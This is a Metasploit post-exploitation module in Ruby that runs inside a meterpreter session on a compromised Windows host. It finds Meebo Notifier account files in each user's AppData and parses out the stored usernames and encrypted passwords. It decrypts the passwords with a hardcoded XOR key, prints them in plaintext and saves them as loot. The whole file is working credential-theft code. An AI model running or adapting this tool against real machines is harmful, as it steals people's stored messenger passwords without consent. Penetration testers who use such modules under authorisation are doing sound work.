##
#$Id: meebo.rb 13866 2011-10-11 00:38:50Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/windows/user_profiles'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::UserProfiles


	def initialize(info={})
		super( update_info( info,
				'Name' => 'Windows Gather Meebo Password Extractor',
				'Description' => %q{
						This module extracts login account password stored by
						Meebo Notifier, a desktop version of Meebo's Online Messenger.},
				'License' => MSF_LICENSE,
				'Author' => 
					[ 
						'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',
						'SecurityXploded Team  <www.SecurityXploded.com>'
					],
				'Version' => '$Revision: 13866 $',
				'Platform' => [ 'windows' ],
				'SessionTypes' => [ 'meterpreter' ]
		))

	end

	def run
		grab_user_profiles().each do |user|
			accounts = user['AppData'] + "\\Meebo\\MeeboAccounts.txt"
			next if user['AppData'] == nil
			next if accounts.empty?
			stat = session.fs.file.stat(accounts) rescue nil
			next if stat.nil?
			parse_txt(accounts)
		end
	end

	def parse_txt(file)
		begin
			creds = Rex::Ui::Text::Table.new(
				'Header'  => 'Meebo Instant Messenger Credentials',
				'Ident'	=> 1,
				'Columns' =>
				[
						'Protocol',
						'User',
						'Password'
				]
			)

			config = client.fs.file.new(file,'r')
			parse = config.read

			if (parse =~ /"password.{5}(.*)",\s*"protocol.{4}(\d),\s*"username.{5}(.*)"/)
				epass = $1
				protocol = $2.to_i
				username = $3
			else
				print_status("Regex failed...")
				return
			end

			protocol = "Meebo"        if protocol == 0
			protocol = "AIM"          if protocol == 1
			protocol = "Yahoo IM"     if protocol == 2
			protocol = "Windows Live" if protocol == 3
			protocol = "Google Talk"  if protocol == 4
			protocol = "ICQ"          if protocol == 5
			protocol = "Jabber"       if protocol == 6
			protocol = "Myspace IM"   if protocol == 7

			passwd = decrypt(epass)
			print_good("*** Protocol: #{protocol}  User: #{username}  Password: #{passwd}  ***")
			creds << [protocol, username, passwd]
			config.close

			if passwd == nil or username == nil
				print_status("Meebo credentials have not been found")
			else
				print_status("Storing data...")
				path = store_loot(
					'meebo.user.creds',
					'text/plain',
					session,
					creds,
					'meebo_user_creds.txt',
					'Meebo Notifier User Credentials'
				)
				print_status("Meebo Notifier user credentials saved in: #{path}")
			end

		rescue ::Exception => e
			print_error("An error has occured: #{e.to_s}")
		end
	end

	def decrypt (epass)
		magicarr = [4,240,122,53,65,19,163,124,109,
		73,187,3,34,93,15,138,11,153,148,147,146,
		222,129,160,199,104,240,43,89,105,204,236,
		253,168,96,48,158,143,173,60,215,104,112,
		149,15,114,107,4,92,149,48,177,42,133,124,
		152,63,137,2,40,84,131]

		plaintext = [epass].pack("H*").unpack("C*")

		for i in 0 .. plaintext.length-1 do
			plaintext[i] ^= magicarr[i]
		end

		return plaintext.pack("C*")
	end
end
